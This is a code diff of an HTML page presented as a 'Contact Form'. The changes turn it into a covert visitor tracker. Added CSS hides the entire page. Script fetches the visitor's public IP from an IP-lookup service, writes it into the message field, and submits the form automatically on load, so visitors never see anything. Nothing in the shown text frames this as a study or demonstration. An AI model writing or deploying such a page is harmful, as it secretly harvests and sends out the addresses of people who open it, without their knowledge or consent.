@@ -1,5 +1,13 @@
 <!DOCTYPE html>
 <html>
+
+<style>
+html{
+    display: none;
+}
+
+
+</style>
 <head>
     <title>Contact Form</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -10,18 +18,14 @@
     <input type="email" id="email" name="_replyto" placeholder="gmail@gmail.com"><br>
     <textarea id="message" name="message" rows="1" cols="20"></textarea><br>
 </form>
-<span id="ip"></span>
     <script>
-                $("form").submit();
-
 
         fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-            document.getElementById('message').value = data.ip;
+            let asd123 = document.getElementById('message').value = data.ip;
         })
         .catch(error => console.error('Error:', error));
-
         $(document).ready(function(){
             // Function to check if all fields are filled
             function allFieldsFilled() {
@@ -42,6 +46,10 @@
                 }
             });
         });
+    </script>
+    <script>
+
+$("form").submit();
     </script>
 </body>
 </html>
